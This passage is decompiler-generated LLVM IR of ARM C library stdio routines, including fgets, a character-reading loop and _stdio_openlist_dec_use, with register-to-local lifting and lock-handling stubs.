  store i32 %v1_18274, i32* %v2_18268, align 4
  %v0_1827c = load i32, i32* @r1, align 4
  %v1_1827c = load i32, i32* %r3.global-to-local, align 4
  %v3_1827c = icmp uge i32 %v0_1827c, %v1_1827c
  store i1 %v3_1827c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_1827c, label %dec_label_pc_1828c, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_18268
  %v2_18280 = inttoptr i32 %v0_1827c to i8*
  %v3_18280 = load i8, i8* %v2_18280, align 1
  %v4_18280 = zext i8 %v3_18280 to i32
  store i32 %v4_18280, i32* %r5.global-to-local, align 4
  %v6_18280 = add i32 %v0_1827c, 1
  store i32 %v6_18280, i32* @r1, align 4
  %v2_18284 = load i32, i32* @r7, align 4
  %v3_18284 = add i32 %v2_18284, 16
  %v4_18284 = inttoptr i32 %v3_18284 to i32*
  store i32 %v6_18280, i32* %v4_18284, align 4
  br label %dec_label_pc_18298

dec_label_pc_1828c:                               ; preds = %dec_label_pc_18268
  %v0_1828c = load i32, i32* @r7, align 4
  %v1_18290 = inttoptr i32 %v0_1828c to i16*
  %v2_18290 = call i32 @getc_unlocked(i16* %v1_18290)
  store i32 %v2_18290, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18298

dec_label_pc_18298:                               ; preds = %.thread2, %dec_label_pc_1828c
  %v0_18298 = load i32, i32* @r7, align 4
  %v1_18298 = add i32 %v0_18298, 60
  %v2_18298 = inttoptr i32 %v1_18298 to i32*
  %v3_18298 = load i32, i32* %v2_18298, align 4
  %v1_1829c = add i32 %v3_18298, -1
  store i32 %v1_1829c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_182a0 = icmp eq i32 %v1_1829c, 0
  store i32 %v1_1829c, i32* %v2_18298, align 4
  br i1 %v2_182a0, label %dec_label_pc_182ac, label %dec_label_pc_1830c

dec_label_pc_182ac:                               ; preds = %dec_label_pc_18298
  %v0_182ac = load i32, i32* %r3.global-to-local, align 4
  %v1_182ac = load i32, i32* @r7, align 4
  %v2_182ac = add i32 %v1_182ac, 64
  %v3_182ac = inttoptr i32 %v2_182ac to i32*
  store i32 %v0_182ac, i32* %v3_182ac, align 4
  %v0_182b0 = load i32, i32* @r7, align 4
  %v1_182b0 = add i32 %v0_182b0, 56
  store i32 %v1_182b0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_182b4

dec_label_pc_182b4:                               ; preds = %dec_label_pc_182e4.dec_label_pc_182b4_crit_edge, %dec_label_pc_182ac
  %v0_182bc = phi i32 [ %v0_182bc.pre, %dec_label_pc_182e4.dec_label_pc_182b4_crit_edge ], [ %v1_182b0, %dec_label_pc_182ac ]
  %v0_182b4 = phi i32 [ %v0_182b4.pre, %dec_label_pc_182e4.dec_label_pc_182b4_crit_edge ], [ %v0_182b0, %dec_label_pc_182ac ]
  %v1_182b4 = add i32 %v0_182b4, 56
  %v2_182b4 = inttoptr i32 %v1_182b4 to i32*
  %v3_182b4 = load i32, i32* %v2_182b4, align 4
  store i32 %v3_182b4, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_182bc, i32* %r2.global-to-local, align 4
  %v1_182c022 = inttoptr i32 %v0_182bc to i32*
  %v2_182c023 = load i32, i32* %v1_182c022, align 4
  store i32 %v2_182c023, i32* %r3.global-to-local, align 4
  %v3_182c425 = icmp uge i32 %v2_182c023, %v3_182b4
  store i1 %v3_182c425, i1* %cpsr_c.global-to-local, align 1
  %v9_182c431 = icmp eq i32 %v2_182c023, %v3_182b4
  br i1 %v9_182c431, label %dec_label_pc_182cc, label %dec_label_pc_182e4

dec_label_pc_182cc:                               ; preds = %dec_label_pc_182b4, %dec_label_pc_182cc.dec_label_pc_182c0_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_182dc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_182dc, label %dec_label_pc_182e0, label %dec_label_pc_182cc.dec_label_pc_182c0_crit_edge

dec_label_pc_182cc.dec_label_pc_182c0_crit_edge:  ; preds = %dec_label_pc_182cc
  %v0_182c0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_182c4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_182c0 = inttoptr i32 %v0_182c0.pre to i32*
  %v2_182c0 = load i32, i32* %v1_182c0, align 4
  store i32 %v2_182c0, i32* %r3.global-to-local, align 4
  %v3_182c4 = icmp uge i32 %v2_182c0, %v1_182c4.pre
  store i1 %v3_182c4, i1* %cpsr_c.global-to-local, align 1
  %v9_182c4 = icmp eq i32 %v2_182c0, %v1_182c4.pre
  br i1 %v9_182c4, label %dec_label_pc_182cc, label %dec_label_pc_182e4

dec_label_pc_182e0:                               ; preds = %dec_label_pc_182cc
  %v0_182e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_182e0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_182e4

dec_label_pc_182e4:                               ; preds = %dec_label_pc_182b4, %dec_label_pc_182cc.dec_label_pc_182c0_crit_edge, %dec_label_pc_182e0
  %v0_182ec = phi i32 [ %v0_182e0, %dec_label_pc_182e0 ], [ %v2_182c023, %dec_label_pc_182b4 ], [ %v2_182c0, %dec_label_pc_182cc.dec_label_pc_182c0_crit_edge ]
  %v1_182e4 = phi i32 [ %v0_182e0, %dec_label_pc_182e0 ], [ %v3_182b4, %dec_label_pc_182b4 ], [ %v1_182c4.pre, %dec_label_pc_182cc.dec_label_pc_182c0_crit_edge ]
  %v3_182e4 = icmp uge i32 %v0_182ec, %v1_182e4
  store i1 %v3_182e4, i1* %cpsr_c.global-to-local, align 1
  %v9_182e4 = icmp eq i32 %v0_182ec, %v1_182e4
  br i1 %v9_182e4, label %dec_label_pc_182ec, label %dec_label_pc_182e4.dec_label_pc_182b4_crit_edge

dec_label_pc_182e4.dec_label_pc_182b4_crit_edge:  ; preds = %dec_label_pc_182e4
  %v0_182b4.pre = load i32, i32* @r7, align 4
  %v0_182bc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_182b4

dec_label_pc_182ec:                               ; preds = %dec_label_pc_182e4
  %v2_182ec = icmp ne i32 %v1_182e4, 0
  store i1 %v2_182ec, i1* %cpsr_c.global-to-local, align 1
  %v7_182f0 = icmp slt i32 %v1_182e4, 2
  br i1 %v7_182f0, label %dec_label_pc_1830c, label %dec_label_pc_182f4

dec_label_pc_182f4:                               ; preds = %dec_label_pc_182ec
  %v0_182f8 = load i32, i32* @r1, align 4
  %v1_182f8 = add i32 %v0_182f8, 129
  store i32 %v1_182f8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1830c

dec_label_pc_1830c:                               ; preds = %.thread, %dec_label_pc_18298, %dec_label_pc_182f4, %dec_label_pc_182ec, %dec_label_pc_18208
  %v0_1830c = load i32, i32* %r5.global-to-local, align 4
  %v2_18314 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_18314, i32* @r4, align 4
  store i32 %v6_181d8, i32* @r5, align 4
  store i32 %v9_181d8, i32* @r6, align 4
  store i32 %v12_181d8, i32* @r7, align 4
  store i32 %v15_181d8, i32* @lr, align 4
  ret i32 %v0_1830c

; uselistorder directives
  uselistorder i32 %v0_182e0, { 1, 0, 2 }
  uselistorder i32 %v1_182c4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1827c, { 1, 0, 2 }
  uselistorder i32 %v1_18278, { 0, 2, 1 }
  uselistorder i32 %v1_18238, { 1, 0 }
  uselistorder i32 %v3_181f0, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 %arg1, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_1830c, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_182e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_182cc, { 1, 0 }
  uselistorder label %dec_label_pc_18298, { 1, 0 }
  uselistorder label %dec_label_pc_18268, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_18258, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_1831c = load i32, i32* @r4, align 4
  store i32 %v3_1831c, i32* %stack_var_-32, align 4
  %v6_1831c = load i32, i32* @r5, align 4
  %v9_1831c = load i32, i32* @r6, align 4
  %v12_1831c = load i32, i32* @r7, align 4
  %v15_1831c = load i32, i32* @r8, align 4
  %v24_1831c = load i32, i32* @lr, align 4
  %v1_18320 = add i32 %arg3, 52
  %v2_18320 = inttoptr i32 %v1_18320 to i32*
  %v3_18320 = load i32, i32* %v2_18320, align 4
  store i32 %v3_18320, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18324 = icmp eq i32 %v3_18320, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  br i1 %v2_18324, label %dec_label_pc_18338, label %dec_label_pc_1839c

dec_label_pc_18338:                               ; preds = %entry
  %v0_18338 = call i32 @__aeabi_read_tp()
  %v1_1833c = add i32 %arg3, 64
  %v2_1833c = inttoptr i32 %v1_1833c to i32*
  %v3_1833c = load i32, i32* %v2_1833c, align 4
  store i32 %v3_1833c, i32* %r3.global-to-local, align 4
  %v1_18340 = add i32 %v0_18338, -1168
  store i32 %v1_18340, i32* @r8, align 4
  %v3_18344 = icmp uge i32 %v3_1833c, %v1_18340
  store i1 %v3_18344, i1* %cpsr_c.global-to-local, align 1
  %v9_18344 = icmp eq i32 %v3_1833c, %v1_18340
  br i1 %v9_18344, label %dec_label_pc_18390, label %dec_label_pc_1834c

dec_label_pc_1834c:                               ; preds = %dec_label_pc_18338
  %v1_1834c = add i32 %arg3, 56
  store i32 %v1_1834c, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_1834c, i32* %r2.global-to-local, align 4
  %v0_18358 = load i32, i32* @r6, align 4
  store i32 %v0_18358, i32* @r4, align 4
  %v1_1835c36 = inttoptr i32 %v1_1834c to i32*
  %v2_1835c37 = load i32, i32* %v1_1835c36, align 4
  store i32 %v2_1835c37, i32* %r3.global-to-local, align 4
  %v3_1836039 = icmp uge i32 %v2_1835c37, %v0_18358
  store i1 %v3_1836039, i1* %cpsr_c.global-to-local, align 1
  %v9_1836045 = icmp eq i32 %v2_1835c37, %v0_18358
  br i1 %v9_1836045, label %dec_label_pc_18368, label %dec_label_pc_18380

dec_label_pc_18368:                               ; preds = %dec_label_pc_1834c, %dec_label_pc_18368.dec_label_pc_1835c_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_18378 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18378, label %dec_label_pc_1837c, label %dec_label_pc_18368.dec_label_pc_1835c_crit_edge

dec_label_pc_18368.dec_label_pc_1835c_crit_edge:  ; preds = %dec_label_pc_18368
  %v0_1835c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18360.pre = load i32, i32* @r4, align 4
  %v1_1835c = inttoptr i32 %v0_1835c.pre to i32*
  %v2_1835c = load i32, i32* %v1_1835c, align 4
  store i32 %v2_1835c, i32* %r3.global-to-local, align 4
  %v3_18360 = icmp uge i32 %v2_1835c, %v1_18360.pre
  store i1 %v3_18360, i1* %cpsr_c.global-to-local, align 1
  %v9_18360 = icmp eq i32 %v2_1835c, %v1_18360.pre
  br i1 %v9_18360, label %dec_label_pc_18368, label %dec_label_pc_18380

dec_label_pc_1837c:                               ; preds = %dec_label_pc_18368
  %v0_1837c = load i32, i32* @r4, align 4
  store i32 %v0_1837c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18380

dec_label_pc_18380:                               ; preds = %dec_label_pc_1834c, %dec_label_pc_18368.dec_label_pc_1835c_crit_edge, %dec_label_pc_1837c
  %v0_18380 = phi i32 [ %v0_1837c, %dec_label_pc_1837c ], [ %v2_1835c37, %dec_label_pc_1834c ], [ %v2_1835c, %dec_label_pc_18368.dec_label_pc_1835c_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18380 = icmp eq i32 %v0_18380, 0
  br i1 %v2_18380, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_18380
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_18380, %bb
  store i32 99212, i32* @lr, align 4
  %v1_18388 = xor i1 %v2_18380, true
  call void @__pseudo_cond_branch(i1 %v1_18388, i32 ptrtoint (i32* @global_var_16040.925 to i32))
  %v0_1838c = load i32, i32* @r8, align 4
  %v1_1838c = load i32, i32* @r7, align 4
  %v2_1838c = add i32 %v1_1838c, 64
  %v3_1838c = inttoptr i32 %v2_1838c to i32*
  store i32 %v0_1838c, i32* %v3_1838c, align 4
  br label %dec_label_pc_18390

dec_label_pc_18390:                               ; preds = %dec_label_pc_18338, %bb20
  %v0_18390 = load i32, i32* @r7, align 4
  %v1_18390 = add i32 %v0_18390, 60
  %v2_18390 = inttoptr i32 %v1_18390 to i32*
  %v3_18390 = load i32, i32* %v2_18390, align 4
  %v1_18394 = add i32 %v3_18390, 1
  store i32 %v1_18394, i32* %r3.global-to-local, align 4
  store i32 %v1_18394, i32* %v2_18390, align 4
  %v0_1839c.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_183a0.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_183a4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1839c

dec_label_pc_1839c:                               ; preds = %entry, %dec_label_pc_18390
  %v0_183a4 = phi i32 [ %arg3, %entry ], [ %v0_183a4.pre, %dec_label_pc_18390 ]
  %v0_183a0 = phi i32 [ %arg2, %entry ], [ %v0_183a0.pre, %dec_label_pc_18390 ]
  %v0_1839c = phi i32 [ %arg1, %entry ], [ %v0_1839c.pre, %dec_label_pc_18390 ]
  store i32 %v0_183a0, i32* %r1.global-to-local, align 4
  store i32 %v0_183a4, i32* %r2.global-to-local, align 4
  %v3_183a8 = inttoptr i32 %v0_1839c to i8*
  %v4_183a8 = call i32 @__GI_fgets_unlocked(i8* %v3_183a8, i32 %v0_183a0, i32 %v0_183a4)
  %v0_183ac = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_183ac = icmp eq i32 %v0_183ac, 0
  store i32 %v4_183a8, i32* %r8.global-to-local, align 4
  br i1 %v2_183ac, label %dec_label_pc_183b8, label %dec_label_pc_1842c

dec_label_pc_183b8:                               ; preds = %dec_label_pc_1839c
  %v0_183b8 = load i32, i32* @r7, align 4
  %v1_183b8 = add i32 %v0_183b8, 60
  %v2_183b8 = inttoptr i32 %v1_183b8 to i32*
  %v3_183b8 = load i32, i32* %v2_183b8, align 4
  %v1_183bc = add i32 %v3_183b8, -1
  store i32 %v1_183bc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_183c0 = icmp eq i32 %v1_183bc, 0
  store i32 %v1_183bc, i32* %v2_183b8, align 4
  br i1 %v2_183c0, label %dec_label_pc_183cc, label %dec_label_pc_1842c

dec_label_pc_183cc:                               ; preds = %dec_label_pc_183b8
  %v0_183cc = load i32, i32* %r3.global-to-local, align 4
  %v1_183cc = load i32, i32* @r7, align 4
  %v2_183cc = add i32 %v1_183cc, 64
  %v3_183cc = inttoptr i32 %v2_183cc to i32*
  store i32 %v0_183cc, i32* %v3_183cc, align 4
  %v0_183d0 = load i32, i32* @r7, align 4
  %v1_183d0 = add i32 %v0_183d0, 56
  store i32 %v1_183d0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_183d4

dec_label_pc_183d4:                               ; preds = %dec_label_pc_18404.dec_label_pc_183d4_crit_edge, %dec_label_pc_183cc
  %v0_183dc = phi i32 [ %v0_183dc.pre, %dec_label_pc_18404.dec_label_pc_183d4_crit_edge ], [ %v1_183d0, %dec_label_pc_183cc ]
  %v0_183d4 = phi i32 [ %v0_183d4.pre, %dec_label_pc_18404.dec_label_pc_183d4_crit_edge ], [ %v0_183d0, %dec_label_pc_183cc ]
  %v1_183d4 = add i32 %v0_183d4, 56
  %v2_183d4 = inttoptr i32 %v1_183d4 to i32*
  %v3_183d4 = load i32, i32* %v2_183d4, align 4
  store i32 %v3_183d4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_183dc, i32* %r2.global-to-local, align 4
  %v1_183e024 = inttoptr i32 %v0_183dc to i32*
  %v2_183e025 = load i32, i32* %v1_183e024, align 4
  store i32 %v2_183e025, i32* %r3.global-to-local, align 4
  %v3_183e427 = icmp uge i32 %v2_183e025, %v3_183d4
  store i1 %v3_183e427, i1* %cpsr_c.global-to-local, align 1
  %v9_183e433 = icmp eq i32 %v2_183e025, %v3_183d4
  br i1 %v9_183e433, label %dec_label_pc_183ec, label %dec_label_pc_18404

dec_label_pc_183ec:                               ; preds = %dec_label_pc_183d4, %dec_label_pc_183ec.dec_label_pc_183e0_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_183fc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_183fc, label %dec_label_pc_18400, label %dec_label_pc_183ec.dec_label_pc_183e0_crit_edge

dec_label_pc_183ec.dec_label_pc_183e0_crit_edge:  ; preds = %dec_label_pc_183ec
  %v0_183e0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_183e4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_183e0 = inttoptr i32 %v0_183e0.pre to i32*
  %v2_183e0 = load i32, i32* %v1_183e0, align 4
  store i32 %v2_183e0, i32* %r3.global-to-local, align 4
  %v3_183e4 = icmp uge i32 %v2_183e0, %v1_183e4.pre
  store i1 %v3_183e4, i1* %cpsr_c.global-to-local, align 1
  %v9_183e4 = icmp eq i32 %v2_183e0, %v1_183e4.pre
  br i1 %v9_183e4, label %dec_label_pc_183ec, label %dec_label_pc_18404

dec_label_pc_18400:                               ; preds = %dec_label_pc_183ec
  %v0_18400 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18400, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18404

dec_label_pc_18404:                               ; preds = %dec_label_pc_183d4, %dec_label_pc_183ec.dec_label_pc_183e0_crit_edge, %dec_label_pc_18400
  %v0_1840c = phi i32 [ %v0_18400, %dec_label_pc_18400 ], [ %v2_183e025, %dec_label_pc_183d4 ], [ %v2_183e0, %dec_label_pc_183ec.dec_label_pc_183e0_crit_edge ]
  %v1_18404 = phi i32 [ %v0_18400, %dec_label_pc_18400 ], [ %v3_183d4, %dec_label_pc_183d4 ], [ %v1_183e4.pre, %dec_label_pc_183ec.dec_label_pc_183e0_crit_edge ]
  %v3_18404 = icmp uge i32 %v0_1840c, %v1_18404
  store i1 %v3_18404, i1* %cpsr_c.global-to-local, align 1
  %v9_18404 = icmp eq i32 %v0_1840c, %v1_18404
  br i1 %v9_18404, label %dec_label_pc_1840c, label %dec_label_pc_18404.dec_label_pc_183d4_crit_edge

dec_label_pc_18404.dec_label_pc_183d4_crit_edge:  ; preds = %dec_label_pc_18404
  %v0_183d4.pre = load i32, i32* @r7, align 4
  %v0_183dc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_183d4

dec_label_pc_1840c:                               ; preds = %dec_label_pc_18404
  %v2_1840c = icmp ne i32 %v1_18404, 0
  store i1 %v2_1840c, i1* %cpsr_c.global-to-local, align 1
  %v7_18410 = icmp slt i32 %v1_18404, 2
  br i1 %v7_18410, label %dec_label_pc_1842c, label %dec_label_pc_18414

dec_label_pc_18414:                               ; preds = %dec_label_pc_1840c
  %v0_18418 = load i32, i32* %r1.global-to-local, align 4
  %v1_18418 = add i32 %v0_18418, 129
  store i32 %v1_18418, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1842c

dec_label_pc_1842c:                               ; preds = %dec_label_pc_183b8, %dec_label_pc_1839c, %dec_label_pc_18414, %dec_label_pc_1840c
  %v0_1842c = load i32, i32* %r8.global-to-local, align 4
  %v2_18430 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_18430, i32* %r4.global-to-local, align 4
  store i32 %v6_1831c, i32* @r5, align 4
  store i32 %v9_1831c, i32* @r6, align 4
  store i32 %v12_1831c, i32* @r7, align 4
  store i32 %v15_1831c, i32* @r8, align 4
  store i32 %v24_1831c, i32* @lr, align 4
  ret i32 %v0_1842c

; uselistorder directives
  uselistorder i32 %v0_18400, { 1, 0, 2 }
  uselistorder i32 %v1_183e4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_183a0, { 1, 0 }
  uselistorder i32 %v0_183a4, { 1, 0 }
  uselistorder i32 %v1_18360.pre, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 11, 4, 5, 6, 7, 9, 8, 12, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 9, 10, 3, 4, 5, 6, 11, 12, 7, 8 }
  uselistorder i32 %arg3, { 0, 2, 1, 4, 3, 5 }
  uselistorder label %dec_label_pc_1842c, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_18404, { 2, 1, 0 }
  uselistorder label %dec_label_pc_183ec, { 1, 0 }
  uselistorder label %dec_label_pc_1839c, { 1, 0 }
  uselistorder label %dec_label_pc_18390, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_18380, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18368, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_18438 = load i32, i32* @r4, align 4
  store i32 %v3_18438, i32* %stack_var_-20, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r5.global-to-local, align 4
  %v4_18448 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 160) to i32*), align 4
  store i32 %v4_18448, i32* %r7.global-to-local, align 4
  %v0_1844c = call i32 @__aeabi_read_tp()
  store i32 %v0_1844c, i32* %r0.global-to-local, align 4
  %v1_18450 = add i32 %v4_18448, 8
  %v2_18450 = inttoptr i32 %v1_18450 to i32*
  %v3_18450 = load i32, i32* %v2_18450, align 4
  store i32 %v3_18450, i32* %r3.global-to-local, align 4
  %v1_18454 = add i32 %v0_1844c, -1168
  store i32 %v1_18454, i32* %r6.global-to-local, align 4
  %v3_18458 = icmp uge i32 %v3_18450, %v1_18454
  store i1 %v3_18458, i1* %cpsr_c.global-to-local, align 1
  %v9_18458 = icmp eq i32 %v3_18450, %v1_18454
  br i1 %v9_18458, label %dec_label_pc_184a4, label %dec_label_pc_18464

dec_label_pc_18464:                               ; preds = %entry
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_18448, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1847093 = inttoptr i32 %v4_18448 to i32*
  %v2_1847094 = load i32, i32* %v1_1847093, align 4
  store i32 %v2_1847094, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1847496 = icmp eq i32 %v2_1847094, 0
  br i1 %v9_1847496, label %dec_label_pc_1847c, label %dec_label_pc_18494

dec_label_pc_1847c:                               ; preds = %dec_label_pc_18464, %dec_label_pc_1847c.dec_label_pc_18470_crit_edge
  %v0_1847c97 = phi i32 [ %v1_18474.pre, %dec_label_pc_1847c.dec_label_pc_18470_crit_edge ], [ 0, %dec_label_pc_18464 ]
  store i32 %v0_1847c97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1848c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1848c, label %dec_label_pc_18490, label %dec_label_pc_1847c.dec_label_pc_18470_crit_edge

dec_label_pc_1847c.dec_label_pc_18470_crit_edge:  ; preds = %dec_label_pc_1847c
  %v0_18470.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18474.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_18470 = inttoptr i32 %v0_18470.pre to i32*
  %v2_18470 = load i32, i32* %v1_18470, align 4
  store i32 %v2_18470, i32* %r3.global-to-local, align 4
  %v3_18474 = icmp uge i32 %v2_18470, %v1_18474.pre
  store i1 %v3_18474, i1* %cpsr_c.global-to-local, align 1
  %v9_18474 = icmp eq i32 %v2_18470, %v1_18474.pre
  br i1 %v9_18474, label %dec_label_pc_1847c, label %dec_label_pc_18494

dec_label_pc_18490:                               ; preds = %dec_label_pc_1847c
  %v0_18490 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18490, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18494

dec_label_pc_18494:                               ; preds = %dec_label_pc_18464, %dec_label_pc_1847c.dec_label_pc_18470_crit_edge, %dec_label_pc_18490
  %v0_18494 = phi i32 [ %v0_18490, %dec_label_pc_18490 ], [ %v2_1847094, %dec_label_pc_18464 ], [ %v2_18470, %dec_label_pc_1847c.dec_label_pc_18470_crit_edge ]
  %v1_18494 = phi i32 [ %v0_18490, %dec_label_pc_18490 ], [ 0, %dec_label_pc_18464 ], [ %v1_18474.pre, %dec_label_pc_1847c.dec_label_pc_18470_crit_edge ]
  %v3_18494 = icmp uge i32 %v0_18494, %v1_18494
  store i1 %v3_18494, i1* %cpsr_c.global-to-local, align 1
  %v9_18494 = icmp eq i32 %v0_18494, %v1_18494
  br i1 %v9_18494, label %bb45, label %bb

bb:                                               ; preds = %dec_label_pc_18494
  %v1_18498 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_18498, i32* %r0.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_18494, %bb
  %v1_1849c = xor i1 %v9_18494, true
  call void @__pseudo_cond_branch(i1 %v1_1849c, i32 ptrtoint (i32* @global_var_16040.925 to i32))
  %v0_184a0 = load i32, i32* %r6.global-to-local, align 4
  %v1_184a0 = load i32, i32* %r7.global-to-local, align 4
  %v2_184a0 = add i32 %v1_184a0, 8
  %v3_184a0 = inttoptr i32 %v2_184a0 to i32*
  store i32 %v0_184a0, i32* %v3_184a0, align 4
  br label %dec_label_pc_184a4

dec_label_pc_184a4:                               ; preds = %entry, %bb45
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_184a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_184a8 = add i32 %v0_184a8, 160
  %v3_184a8 = inttoptr i32 %v2_184a8 to i32*
  %v4_184a8 = load i32, i32* %v3_184a8, align 4
  store i32 %v4_184a8, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_184b0 = add i32 %v0_184a8, 12
  %v3_184b0 = inttoptr i32 %v2_184b0 to i32*
  %v4_184b0 = load i32, i32* %v3_184b0, align 4
  store i32 %v4_184b0, i32* %r3.global-to-local, align 4
  %v1_184b4 = inttoptr i32 %v4_184b0 to i32*
  %v2_184b4 = load i32, i32* %v1_184b4, align 4
  store i32 %v2_184b4, i32* %r1.global-to-local, align 4
  %v1_184b8 = add i32 %v4_184a8, 4
  %v2_184b8 = inttoptr i32 %v1_184b8 to i32*
  %v3_184b8 = load i32, i32* %v2_184b8, align 4
  %v2_184bc = icmp ne i32 %v2_184b4, 0
  store i1 %v2_184bc, i1* %cpsr_c.global-to-local, align 1
  %v7_184bc = icmp eq i32 %v2_184b4, 1
  %v1_184c0 = add i32 %v3_184b8, 1
  store i32 %v1_184c0, i32* %r3.global-to-local, align 4
  store i32 %v1_184c0, i32* %v2_184b8, align 4
  br i1 %v7_184bc, label %dec_label_pc_184cc, label %dec_label_pc_18630

dec_label_pc_184cc:                               ; preds = %dec_label_pc_184a4
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_184d0 = load i32, i32* %r5.global-to-local, align 4
